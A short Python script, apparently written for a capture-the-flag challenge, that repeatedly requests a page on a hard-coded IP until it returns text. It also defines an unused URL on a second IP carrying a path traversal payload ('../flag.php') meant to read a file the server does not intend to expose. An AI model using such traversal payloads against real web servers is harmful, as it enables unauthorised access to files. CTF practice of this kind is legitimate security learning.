import requests
while(True):
    url='http://123.206.203.108:10001/random.php'
    url_1='http://118.25.18.223:10012/show_maopian.php?mao=../flag.php'
    html=requests.get(url)
    if html.text:
        print(html.text)
        break
    print("1")